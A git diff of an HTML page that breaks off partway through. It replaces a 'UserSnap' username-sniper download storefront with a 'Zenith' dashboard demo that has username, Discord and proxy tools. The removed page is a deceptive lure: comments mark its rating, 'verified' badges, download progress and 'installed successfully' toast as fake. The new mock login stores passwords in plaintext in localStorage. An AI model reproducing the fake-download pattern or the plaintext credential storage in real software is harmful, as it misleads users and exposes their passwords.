@@ -2,907 +2,1240 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>UserSnap · Username Sniper · Cross-Platform</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5">
+    <title>Zenith · everything you need</title>
+    <!-- Font & icons (minimal, no emoji) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* ----- RESET & BASE ----- */
-        * { margin:0; padding:0; box-sizing:border-box; }
+        /* ----- DESIGN SYSTEM (dark premium) ----- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg: #0b0d10;
+            --surface: #14171c;
+            --surface-2: #1e222a;
+            --border: #2b313a;
+            --text: #e8edf5;
+            --muted: #8a94a6;
+            --primary: #6c8cff;
+            --primary-hover: #5274e0;
+            --success: #3dd68c;
+            --warning: #f0b34b;
+            --danger: #f25a6a;
+            --radius: 14px;
+            --shadow: 0 12px 30px rgba(0, 0, 0, 0.6);
+            --transition: 0.2s ease;
+            --font: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
         body {
-            background: #0a0c10;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 1.5rem;
-            color: #e8edf5;
-        }
-        /* ----- MAIN CARD (the download storefront) ----- */
-        .store {
-            background: #14181e;
-            border-radius: 2.5rem;
-            padding: 2.8rem 3rem;
-            max-width: 860px;
-            width: 100%;
-            box-shadow: 0 30px 60px -15px rgba(0,0,0,0.9);
-            border: 1px solid #2a3038;
-            transition: all 0.25s;
-            position: relative;
-            overflow: hidden;
-        }
-        .store::before {
-            content: '';
-            position: absolute;
-            top: -60%;
-            left: -60%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle at 30% 20%, rgba(37,99,235,0.03) 0%, transparent 60%);
-            pointer-events: none;
-        }
-        /* ----- HEADER ----- */
-        .store-header {
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            margin-bottom: 1.2rem;
-            position: relative;
-            z-index: 2;
-        }
-        .store-header .logo {
-            width: 48px;
-            height: 48px;
-            background: linear-gradient(135deg, #2563eb, #3b82f6);
-            border-radius: 1.2rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.6rem;
-            font-weight: 800;
-            color: #fff;
-            box-shadow: 0 8px 20px -8px rgba(37,99,235,0.4);
-        }
-        .store-header h1 {
-            font-weight: 700;
-            font-size: 1.8rem;
-            letter-spacing: -0.5px;
-        }
-        .store-header .badge {
-            background: #1e293b;
-            color: #94a3b8;
-            font-size: 0.6rem;
-            font-weight: 600;
-            padding: 0.25rem 0.9rem;
-            border-radius: 999px;
-            border: 1px solid #2d3744;
-            text-transform: uppercase;
-            margin-left: 0.5rem;
-        }
-        .store-header .rating {
-            margin-left: auto;
-            display: flex;
-            align-items: center;
-            gap: 0.4rem;
-            background: #1e293b;
-            padding: 0.3rem 1rem;
-            border-radius: 999px;
-            font-size: 0.85rem;
-            border: 1px solid #2d3744;
-        }
-        .store-header .rating span { color: #fbbf24; letter-spacing: 2px; }
-        /* ----- TAGLINE ----- */
-        .tagline {
-            color: #9aa9c2;
-            font-size: 1rem;
-            margin-bottom: 2rem;
-            padding-left: 0.2rem;
-            border-left: 3px solid #2d3744;
-            padding-left: 1.2rem;
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--font);
             line-height: 1.5;
-            position: relative;
-            z-index: 2;
-        }
-        /* ----- PLATFORM SELECTOR (tabs) ----- */
-        .platform-tabs {
             display: flex;
-            gap: 0.6rem;
-            margin-bottom: 2rem;
-            flex-wrap: wrap;
-            position: relative;
-            z-index: 2;
+            min-height: 100vh;
+            transition: background 0.2s;
         }
-        .platform-tabs .tab {
-            background: #1e242b;
-            border: 1px solid #2a3038;
-            border-radius: 1rem;
-            padding: 0.6rem 1.4rem;
-            font-size: 0.85rem;
-            font-weight: 500;
-            color: #8b9bb5;
-            cursor: pointer;
-            transition: all 0.2s;
+
+        /* scroll */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: var(--surface); }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
+
+        a { color: var(--primary); text-decoration: none; }
+        .text-muted { color: var(--muted); }
+
+        /* ----- SIDEBAR (desktop) ----- */
+        .sidebar {
+            width: 260px;
+            background: var(--surface);
+            border-right: 1px solid var(--border);
+            height: 100vh;
+            position: sticky;
+            top: 0;
+            display: flex;
+            flex-direction: column;
+            padding: 1.5rem 0.8rem;
+            transition: 0.2s;
+            overflow-y: auto;
+            flex-shrink: 0;
+            z-index: 100;
+        }
+        .sidebar.collapsed { width: 72px; }
+        .sidebar.collapsed .sidebar-label,
+        .sidebar.collapsed .brand-text { display: none; }
+        .sidebar.collapsed .brand-icon { font-size: 1.6rem; }
+
+        .brand {
             display: flex;
             align-items: center;
-            gap: 0.5rem;
+            gap: 10px;
+            padding: 0 0.8rem 1.8rem 0.8rem;
+            border-bottom: 1px solid var(--border);
         }
-        .platform-tabs .tab:hover { background: #2a323c; border-color: #3b82f6; }
-        .platform-tabs .tab.active {
-            background: #1e293b;
-            border-color: #3b82f6;
-            color: #e8edf5;
-            box-shadow: 0 0 20px -5px rgba(37,99,235,0.15);
+        .brand-icon { font-size: 1.8rem; color: var(--primary); }
+        .brand-text { font-weight: 600; font-size: 1.3rem; letter-spacing: -0.5px; }
+
+        .sidebar-nav {
+            flex: 1;
+            margin-top: 1.5rem;
         }
-        .platform-tabs .tab .icon { font-size: 1.2rem; }
-        /* ----- DOWNLOAD PANEL ----- */
-        .download-panel {
-            background: #0f1318;
-            border-radius: 1.8rem;
-            padding: 2rem 2.2rem;
-            border: 1px solid #1e293b;
-            margin-bottom: 1.8rem;
-            position: relative;
-            z-index: 2;
-            transition: all 0.3s;
-        }
-        .download-panel .platform-name {
-            font-size: 1.2rem;
-            font-weight: 600;
-            margin-bottom: 0.3rem;
-        }
-        .download-panel .platform-desc {
-            color: #8b9bb5;
-            font-size: 0.9rem;
-            margin-bottom: 1.5rem;
-        }
-        .download-panel .download-row {
+        .sidebar-nav a {
             display: flex;
-            gap: 1rem;
-            flex-wrap: wrap;
             align-items: center;
+            gap: 14px;
+            padding: 0.7rem 0.9rem;
+            border-radius: var(--radius);
+            color: var(--muted);
+            transition: 0.15s;
+            margin-bottom: 2px;
+            font-weight: 450;
         }
-        .download-btn {
-            background: #2563eb;
+        .sidebar-nav a i { width: 22px; font-size: 1.1rem; }
+        .sidebar-nav a:hover, .sidebar-nav a.active {
+            background: var(--surface-2);
+            color: var(--text);
+        }
+        .sidebar-nav a.active { color: var(--primary); }
+
+        .sidebar-footer {
+            border-top: 1px solid var(--border);
+            padding-top: 1.2rem;
+            font-size: 0.8rem;
+            color: var(--muted);
+        }
+
+        /* ----- MAIN LAYOUT ----- */
+        .main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            max-width: 100%;
+        }
+
+        /* top bar */
+        .topbar {
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+            padding: 0.8rem 2rem;
+            display: flex;
+            align-items: center;
+            gap: 1.2rem;
+            flex-wrap: wrap;
+            position: sticky;
+            top: 0;
+            z-index: 50;
+        }
+        .topbar .menu-toggle { display: none; background: none; border: none; color: var(--text); font-size: 1.3rem; cursor: pointer; }
+        .topbar .search-wrap {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            background: var(--bg);
+            border-radius: 40px;
+            padding: 0.3rem 1rem;
+            border: 1px solid var(--border);
+            min-width: 160px;
+        }
+        .topbar .search-wrap i { color: var(--muted); margin-right: 10px; }
+        .topbar .search-wrap input {
+            background: transparent;
             border: none;
-            color: #fff;
-            font-weight: 600;
-            padding: 0.9rem 2.2rem;
-            border-radius: 1.2rem;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: all 0.15s;
+            color: var(--text);
+            width: 100%;
+            padding: 0.5rem 0;
+            outline: none;
+            font-size: 0.9rem;
+        }
+        .topbar .actions {
             display: flex;
             align-items: center;
-            gap: 0.7rem;
-            font-family: inherit;
-            box-shadow: 0 6px 16px -4px rgba(37,99,235,0.3);
-            flex: 1 1 auto;
+            gap: 1.2rem;
         }
-        .download-btn:hover { background: #1d4ed8; transform: scale(0.97); }
-        .download-btn:disabled { opacity: 0.4; pointer-events: none; }
-        .download-btn .badge-icon { font-size: 1.3rem; }
-        .download-btn .sub {
-            font-weight: 400;
-            font-size: 0.7rem;
-            opacity: 0.7;
-            display: block;
+        .topbar .actions button {
+            background: none;
+            border: none;
+            color: var(--muted);
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: 0.15s;
         }
-        .download-btn .main { font-size: 1rem; }
-        .download-btn.secondary {
-            background: #1e293b;
-            box-shadow: none;
-            border: 1px solid #2d3744;
+        .topbar .actions button:hover { color: var(--text); }
+
+        .workspace-badge {
+            background: var(--surface-2);
+            padding: 0.2rem 0.9rem;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            border: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 6px;
         }
-        .download-btn.secondary:hover { background: #2a323c; }
-        .verification-badge {
+
+        /* page content */
+        .page-content {
+            padding: 2rem 2.2rem;
+            flex: 1;
+            max-width: 1400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        /* cards */
+        .card-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1.5rem;
+            margin: 1.8rem 0;
+        }
+        .stat-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 1.2rem 1.5rem;
+            transition: 0.15s;
+        }
+        .stat-card:hover { border-color: var(--primary); }
+        .stat-card .num { font-size: 2rem; font-weight: 600; margin: 0.3rem 0; }
+        .stat-card .label { color: var(--muted); font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.4px; }
+
+        .card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 1.5rem;
+            margin-bottom: 1.8rem;
+        }
+        .card-title { font-weight: 600; font-size: 1.1rem; margin-bottom: 1rem; display: flex; align-items: center; gap: 8px; }
+
+        .btn {
+            background: var(--surface-2);
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 0.5rem 1.2rem;
+            border-radius: 40px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.15s;
             display: inline-flex;
             align-items: center;
-            gap: 0.3rem;
-            background: #0f1318;
-            padding: 0.2rem 0.9rem;
-            border-radius: 999px;
+            gap: 8px;
+            font-size: 0.9rem;
+        }
+        .btn-primary { background: var(--primary); border-color: var(--primary); color: #fff; }
+        .btn-primary:hover { background: var(--primary-hover); border-color: var(--primary-hover); }
+        .btn-danger { background: var(--danger); border-color: var(--danger); color: #fff; }
+        .btn-danger:hover { background: #d94454; }
+        .btn-sm { padding: 0.3rem 0.9rem; font-size: 0.8rem; }
+        .btn-outline { background: transparent; }
+
+        .flex { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+        .flex-between { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+
+        .badge {
+            background: var(--surface-2);
+            padding: 0.15rem 0.7rem;
+            border-radius: 30px;
             font-size: 0.7rem;
-            color: #34d399;
-            border: 1px solid #1e293b;
+            font-weight: 500;
+            border: 1px solid var(--border);
         }
-        /* ----- PROGRESS (fake download) ----- */
-        .download-progress {
-            margin-top: 1.5rem;
-            display: none;
+        .badge-owner { background: #6c8cff20; color: var(--primary); border-color: var(--primary); }
+
+        /* forms */
+        input, select, textarea {
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 0.7rem 1rem;
+            color: var(--text);
+            width: 100%;
+            font-family: var(--font);
+            transition: 0.15s;
         }
-        .download-progress.active { display: block; }
-        .download-progress .bar-track {
-            background: #1e242b;
-            border-radius: 999px;
-            height: 8px;
-            overflow: hidden;
-            border: 1px solid #2a3038;
-        }
-        .download-progress .bar-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #2563eb, #60a5fa);
-            border-radius: 999px;
-            transition: width 0.3s ease;
-        }
-        .download-progress .status-msg {
-            margin-top: 0.6rem;
-            font-size: 0.85rem;
-            color: #94a3b8;
-            display: flex;
-            justify-content: space-between;
-        }
-        /* ----- FEATURES GRID (fake) ----- */
-        .features {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 0.8rem;
-            margin: 1.8rem 0 1.2rem;
-            position: relative;
-            z-index: 2;
-        }
-        .features .feat {
-            background: #0f1318;
-            border-radius: 1rem;
-            padding: 0.8rem 1rem;
-            border: 1px solid #1e293b;
-            font-size: 0.8rem;
-            color: #b0c0d5;
+        input:focus, select:focus, textarea:focus { border-color: var(--primary); outline: none; }
+        label { font-weight: 450; font-size: 0.9rem; margin-bottom: 0.3rem; display: block; }
+        .form-group { margin-bottom: 1.2rem; }
+
+        /* modals */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(4px);
             display: flex;
             align-items: center;
-            gap: 0.6rem;
+            justify-content: center;
+            z-index: 999;
+            opacity: 0;
+            pointer-events: none;
+            transition: 0.2s;
         }
-        .features .feat .check { color: #34d399; }
-        /* ----- FOOTER / LEGAL (fake) ----- */
-        .store-footer {
-            margin-top: 1.8rem;
-            padding-top: 1.2rem;
-            border-top: 1px solid #1e293b;
-            display: flex;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 0.8rem;
-            font-size: 0.7rem;
-            color: #475569;
-            position: relative;
-            z-index: 2;
+        .modal-overlay.open { opacity: 1; pointer-events: auto; }
+        .modal-box {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            max-width: 520px;
+            width: 95%;
+            padding: 2rem;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: var(--shadow);
         }
-        .store-footer a { color: #64748b; text-decoration: none; }
-        .store-footer a:hover { color: #94a3b8; }
-        /* ----- RESPONSIVE ----- */
-        @media (max-width: 640px) {
-            .store { padding: 1.6rem; }
-            .store-header { flex-wrap: wrap; }
-            .store-header .rating { margin-left: 0; }
-            .download-panel { padding: 1.2rem; }
-            .download-btn { justify-content: center; }
-            .platform-tabs .tab { font-size: 0.75rem; padding: 0.4rem 0.9rem; }
-        }
-        /* ----- HIDDEN HONEYPOT ----- */
-        .hidden-input { position:absolute; opacity:0; width:0; height:0; pointer-events:none; }
-        /* ----- SUCCESS OVERLAY (fake) ----- */
-        .success-toast {
+
+        /* toast */
+        .toast-container {
             position: fixed;
             bottom: 2rem;
-            left: 50%;
-            transform: translateX(-50%) translateY(80px);
-            background: #0f1318;
-            border: 1px solid #2d3744;
-            padding: 0.8rem 2rem;
-            border-radius: 1.2rem;
-            color: #34d399;
-            font-weight: 500;
-            font-size: 0.9rem;
-            opacity: 0;
-            transition: all 0.4s ease;
-            pointer-events: none;
-            z-index: 999;
-            box-shadow: 0 12px 40px rgba(0,0,0,0.7);
+            right: 2rem;
+            z-index: 2000;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
         }
-        .success-toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
-        .success-toast .emoji { margin-right: 0.6rem; }
+        .toast {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 0.8rem 1.5rem;
+            box-shadow: var(--shadow);
+            min-width: 200px;
+            backdrop-filter: blur(4px);
+            animation: slideIn 0.25s ease;
+        }
+        .toast-success { border-left: 4px solid var(--success); }
+        .toast-error { border-left: 4px solid var(--danger); }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* mobile bottom nav */
+        .bottom-nav {
+            display: none;
+            background: var(--surface);
+            border-top: 1px solid var(--border);
+            padding: 0.4rem 0;
+            position: sticky;
+            bottom: 0;
+            justify-content: space-around;
+            z-index: 60;
+        }
+        .bottom-nav a {
+            color: var(--muted);
+            font-size: 1.2rem;
+            padding: 0.5rem 0.8rem;
+            border-radius: 30px;
+            transition: 0.15s;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 0.7rem;
+            gap: 2px;
+        }
+        .bottom-nav a i { font-size: 1.3rem; }
+        .bottom-nav a.active { color: var(--primary); }
+
+        /* responsive */
+        @media (max-width: 1024px) {
+            .sidebar { width: 220px; }
+            .sidebar.collapsed { width: 64px; }
+        }
+        @media (max-width: 820px) {
+            .sidebar { position: fixed; left: -300px; width: 260px; height: 100%; transition: 0.25s; box-shadow: var(--shadow); }
+            .sidebar.open { left: 0; }
+            .topbar .menu-toggle { display: block; }
+            .bottom-nav { display: flex; }
+            .page-content { padding: 1.2rem; }
+        }
+        @media (max-width: 480px) {
+            .topbar { padding: 0.6rem 1rem; }
+            .topbar .search-wrap { min-width: 100px; }
+            .card-grid { grid-template-columns: 1fr 1fr; }
+            .stat-card .num { font-size: 1.5rem; }
+        }
+
+        /* utilities */
+        .hidden { display: none !important; }
+        .mt-2 { margin-top: 1.2rem; }
+        .mb-2 { margin-bottom: 1.2rem; }
+        .gap-1 { gap: 0.6rem; }
+        .text-center { text-align: center; }
+        .w-full { width: 100%; }
+
+        /* username lab grid */
+        .username-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+            gap: 12px;
+            margin-top: 1rem;
+        }
+        .username-card {
+            background: var(--surface-2);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 0.8rem;
+            transition: 0.1s;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        .username-card .uname { font-weight: 500; font-size: 1rem; }
+        .username-card .meta { font-size: 0.7rem; color: var(--muted); }
+        .username-card .actions {
+            display: flex;
+            gap: 6px;
+            margin-top: 6px;
+            flex-wrap: wrap;
+        }
+        .username-card .actions button {
+            background: transparent;
+            border: none;
+            color: var(--muted);
+            cursor: pointer;
+            font-size: 0.8rem;
+            padding: 0.1rem 0.4rem;
+            border-radius: 6px;
+        }
+        .username-card .actions button:hover { background: var(--border); color: var(--text); }
+
+        .platform-chip {
+            background: var(--bg);
+            border-radius: 20px;
+            padding: 0.05rem 0.6rem;
+            font-size: 0.65rem;
+            border: 1px solid var(--border);
+            display: inline-block;
+        }
+
+        /* scrollable tabs */
+        .tab-bar {
+            display: flex;
+            gap: 4px;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 0.3rem;
+            flex-wrap: wrap;
+        }
+        .tab-bar button {
+            background: none;
+            border: none;
+            color: var(--muted);
+            padding: 0.4rem 1rem;
+            font-weight: 500;
+            border-radius: 30px;
+            cursor: pointer;
+        }
+        .tab-bar button.active { background: var(--surface-2); color: var(--text); }
+
+        /* AI chat */
+        .chat-container {
+            display: flex;
+            flex-direction: column;
+            height: 400px;
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            background: var(--bg);
+            overflow: hidden;
+        }
+        .chat-messages {
+            flex: 1;
+            overflow-y: auto;
+            padding: 1rem;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .chat-msg {
+            max-width: 80%;
+            padding: 0.7rem 1rem;
+            border-radius: 16px;
+            background: var(--surface-2);
+            align-self: flex-start;
+        }
+        .chat-msg.user { align-self: flex-end; background: var(--primary); color: #fff; }
+        .chat-input-wrap {
+            display: flex;
+            gap: 8px;
+            padding: 0.8rem;
+            background: var(--surface);
+            border-top: 1px solid var(--border);
+        }
+        .chat-input-wrap input { flex: 1; }
+        .chat-input-wrap button { background: var(--primary); border: none; color: #fff; padding: 0 1.2rem; border-radius: 30px; cursor: pointer; }
+
+        /* onboarding wizard */
+        .wizard-step { display: none; }
+        .wizard-step.active { display: block; }
+        .wizard-progress { display: flex; gap: 8px; margin-bottom: 1.5rem; }
+        .wizard-progress .dot { width: 32px; height: 4px; background: var(--border); border-radius: 10px; }
+        .wizard-progress .dot.active { background: var(--primary); }
     </style>
 </head>
 <body>
 
-    <!-- FAKE SUCCESS TOAST -->
-    <div class="success-toast" id="successToast">
-        <span class="emoji">✅</span> UserSnap installed successfully — ready to snipe!
+<!-- SIDEBAR -->
+<aside class="sidebar" id="sidebar">
+    <div class="brand">
+        <span class="brand-icon"><i class="fas fa-cube"></i></span>
+        <span class="brand-text">Zenith</span>
+    </div>
+    <nav class="sidebar-nav" id="sidebarNav">
+        <a href="#" data-view="dashboard" class="active"><i class="fas fa-th-large"></i><span class="sidebar-label">Dashboard</span></a>
+        <a href="#" data-view="workspace"><i class="fas fa-layer-group"></i><span class="sidebar-label">Workspace</span></a>
+        <a href="#" data-view="usernames"><i class="fas fa-tag"></i><span class="sidebar-label">Username Lab</span></a>
+        <a href="#" data-view="discord"><i class="fab fa-discord"></i><span class="sidebar-label">Discord Manager</span></a>
+        <a href="#" data-view="assistant"><i class="fas fa-robot"></i><span class="sidebar-label">AI Assistant</span></a>
+        <a href="#" data-view="projects"><i class="fas fa-code"></i><span class="sidebar-label">Project Builder</span></a>
+        <a href="#" data-view="profiles"><i class="fas fa-user-circle"></i><span class="sidebar-label">Profile Studio</span></a>
+        <a href="#" data-view="proxies"><i class="fas fa-network-wired"></i><span class="sidebar-label">Proxy Lab</span></a>
+        <a href="#" data-view="downloads"><i class="fas fa-download"></i><span class="sidebar-label">Downloads</span></a>
+        <a href="#" data-view="settings"><i class="fas fa-cog"></i><span class="sidebar-label">Settings</span></a>
+    </nav>
+    <div class="sidebar-footer">
+        <span class="badge">v1.0</span> · <span class="text-muted">demo</span>
+    </div>
+</aside>
+
+<!-- MAIN -->
+<div class="main">
+    <!-- topbar -->
+    <header class="topbar">
+        <button class="menu-toggle" id="menuToggle"><i class="fas fa-bars"></i></button>
+        <div class="search-wrap">
+            <i class="fas fa-search"></i>
+            <input type="text" placeholder="Ctrl+K search..." id="globalSearchInput">
+        </div>
+        <div class="actions">
+            <span class="workspace-badge"><i class="fas fa-cubes"></i> <span id="workspaceLabel">default</span></span>
+            <button id="themeToggle"><i class="fas fa-moon"></i></button>
+            <button id="notifBell"><i class="fas fa-bell"></i><span class="badge" style="margin-left: -6px; font-size:0.6rem;">3</span></button>
+            <button id="accountMenuBtn"><i class="fas fa-user-circle" style="font-size:1.6rem;"></i></button>
+        </div>
+    </header>
+
+    <!-- page content -->
+    <div class="page-content" id="pageContent">
+        <!-- views rendered by JS -->
     </div>
 
-    <div class="store" id="storeContainer">
-        <!-- HEADER -->
-        <div class="store-header">
-            <div class="logo">US</div>
-            <h1>UserSnap</h1>
-            <span class="badge">v3.2.1</span>
-            <div class="rating">
-                <span>★★★★★</span> 4.9 (2.4k)
-            </div>
-        </div>
-        <div class="tagline">
-            Real-time username availability across 22 platforms. Download the native app for your device.
-        </div>
+    <!-- bottom nav (mobile) -->
+    <nav class="bottom-nav" id="bottomNav">
+        <a href="#" data-view="dashboard" class="active"><i class="fas fa-th-large"></i><span>Home</span></a>
+        <a href="#" data-view="usernames"><i class="fas fa-tag"></i><span>Usernames</span></a>
+        <a href="#" data-view="assistant"><i class="fas fa-robot"></i><span>AI</span></a>
+        <a href="#" data-view="discord"><i class="fab fa-discord"></i><span>Discord</span></a>
+        <a href="#" data-view="settings"><i class="fas fa-cog"></i><span>Settings</span></a>
+    </nav>
+</div>
 
-        <!-- PLATFORM TABS -->
-        <div class="platform-tabs" id="platformTabs">
-            <div class="tab active" data-platform="ios"><span class="icon"></span> iOS</div>
-            <div class="tab" data-platform="android"><span class="icon">▶</span> Android</div>
-            <div class="tab" data-platform="windows"><span class="icon">⊞</span> Windows</div>
-            <div class="tab" data-platform="macos"><span class="icon">⌘</span> macOS</div>
-            <div class="tab" data-platform="linux"><span class="icon">🐧</span> Linux</div>
-        </div>
+<!-- MODAL container -->
+<div class="modal-overlay" id="modalOverlay">
+    <div class="modal-box" id="modalBox"></div>
+</div>
 
-        <!-- DOWNLOAD PANEL (dynamic) -->
-        <div class="download-panel" id="downloadPanel">
-            <div class="platform-name" id="panelPlatformName">iOS</div>
-            <div class="platform-desc" id="panelPlatformDesc">Native app for iPhone &amp; iPad. Requires iOS 15+.</div>
-            <div class="download-row">
-                <button class="download-btn" id="primaryDownloadBtn">
-                    <span class="badge-icon">⬇</span>
-                    <span>
-                        <span class="main">Download for iOS</span>
-                        <span class="sub">App Store verified</span>
-                    </span>
-                </button>
-                <button class="download-btn secondary" id="secondaryDownloadBtn">
-                    <span class="badge-icon">📦</span>
-                    <span>
-                        <span class="main">.ipa (sideload)</span>
-                        <span class="sub">for developers</span>
-                    </span>
-                </button>
-                <span class="verification-badge">✓ verified</span>
+<!-- TOAST container -->
+<div class="toast-container" id="toastContainer"></div>
+
+<script>
+    // --------------------------------------------------------------
+    //  DATA LAYER (localStorage)
+    // --------------------------------------------------------------
+    const APP_KEY = 'zenith_data';
+    let data = loadData();
+
+    function defaultData() {
+        return {
+            users: [],
+            sessions: [],
+            workspaces: [{ id: 'ws1', name: 'default', ownerId: null }],
+            currentWorkspace: 'ws1',
+            usernames: [],
+            projects: [],
+            conversations: [],
+            discordConfigs: [],
+            proxies: [],
+            profiles: [],
+            notifications: [],
+            settings: { theme: 'dark', accent: '#6c8cff' }
+        };
+    }
+
+    function loadData() {
+        try {
+            const raw = localStorage.getItem(APP_KEY);
+            if (raw) return JSON.parse(raw);
+        } catch (e) {}
+        const d = defaultData();
+        saveData(d);
+        return d;
+    }
+
+    function saveData(d) {
+        if (!d) d = data;
+        localStorage.setItem(APP_KEY, JSON.stringify(d));
+    }
+
+    function generateId() { return Date.now().toString(36) + Math.random().toString(36).slice(2, 7); }
+
+    // helpers
+    function getWorkspace() {
+        return data.workspaces.find(w => w.id === data.currentWorkspace) || data.workspaces[0];
+    }
+
+    function getCurrentUser() {
+        const sid = sessionStorage.getItem('zenith_session');
+        if (!sid) return null;
+        return data.users.find(u => u.id === sid) || null;
+    }
+
+    // authentication mock
+    function loginUser(email, password) {
+        const user = data.users.find(u => u.email === email && u.password === password);
+        if (user) {
+            sessionStorage.setItem('zenith_session', user.id);
+            return user;
+        }
+        return null;
+    }
+
+    function registerUser(username, displayName, email, password) {
+        const exists = data.users.some(u => u.email === email || u.username === username);
+        if (exists) return null;
+        const isFirst = data.users.length === 0;
+        const user = {
+            id: generateId(),
+            username,
+            displayName,
+            email,
+            password,
+            role: isFirst ? 'owner' : 'member',
+            createdAt: new Date().toISOString()
+        };
+        data.users.push(user);
+        if (isFirst) {
+            const ws = data.workspaces[0];
+            ws.ownerId = user.id;
+        }
+        saveData();
+        return user;
+    }
+
+    // notification
+    function addNotification(message, type = 'info') {
+        data.notifications.unshift({ id: generateId(), message, type, timestamp: Date.now() });
+        if (data.notifications.length > 50) data.notifications.pop();
+        saveData();
+        renderNotifications();
+    }
+
+    function showToast(message, type = 'info') {
+        const container = document.getElementById('toastContainer');
+        const t = document.createElement('div');
+        t.className = `toast toast-${type}`;
+        t.textContent = message;
+        container.appendChild(t);
+        setTimeout(() => { t.remove(); }, 3000);
+    }
+
+    // --------------------------------------------------------------
+    //  ROUTER
+    // --------------------------------------------------------------
+    let currentView = 'dashboard';
+
+    function navigate(view) {
+        currentView = view;
+        // update nav
+        document.querySelectorAll('.sidebar-nav a, .bottom-nav a').forEach(el => {
+            el.classList.toggle('active', el.dataset.view === view);
+        });
+        renderView(view);
+        // close mobile sidebar
+        document.getElementById('sidebar').classList.remove('open');
+        // update URL hash
+        window.location.hash = view;
+    }
+
+    function renderView(view) {
+        const container = document.getElementById('pageContent');
+        switch(view) {
+            case 'dashboard': container.innerHTML = renderDashboard(); break;
+            case 'workspace': container.innerHTML = renderWorkspace(); break;
+            case 'usernames': container.innerHTML = renderUsernameLab(); break;
+            case 'discord': container.innerHTML = renderDiscord(); break;
+            case 'assistant': container.innerHTML = renderAssistant(); break;
+            case 'projects': container.innerHTML = renderProjects(); break;
+            case 'profiles': container.innerHTML = renderProfiles(); break;
+            case 'proxies': container.innerHTML = renderProxies(); break;
+            case 'downloads': container.innerHTML = renderDownloads(); break;
+            case 'settings': container.innerHTML = renderSettings(); break;
+            default: container.innerHTML = '<h2>Page not found</h2>';
+        }
+        // re-bind events
+        bindViewEvents(view);
+    }
+
+    // --------------------------------------------------------------
+    //  RENDER FUNCTIONS (each returns HTML string)
+    // --------------------------------------------------------------
+    function renderDashboard() {
+        const user = getCurrentUser();
+        const ws = getWorkspace();
+        const roleBadge = user?.role === 'owner' ? '<span class="badge badge-owner">Owner</span>' : 
+                          user?.role === 'admin' ? '<span class="badge">Admin</span>' : '<span class="badge">Member</span>';
+        return `
+            <div class="flex-between"><h2>Dashboard</h2><span>${roleBadge}</span></div>
+            <div class="card-grid">
+                <div class="stat-card"><div class="label">Projects</div><div class="num">${data.projects.length}</div></div>
+                <div class="stat-card"><div class="label">Saved Usernames</div><div class="num">${data.usernames.length}</div></div>
+                <div class="stat-card"><div class="label">Conversations</div><div class="num">${data.conversations.length}</div></div>
+                <div class="stat-card"><div class="label">Workspaces</div><div class="num">${data.workspaces.length}</div></div>
             </div>
-            <!-- FAKE PROGRESS -->
-            <div class="download-progress" id="downloadProgress">
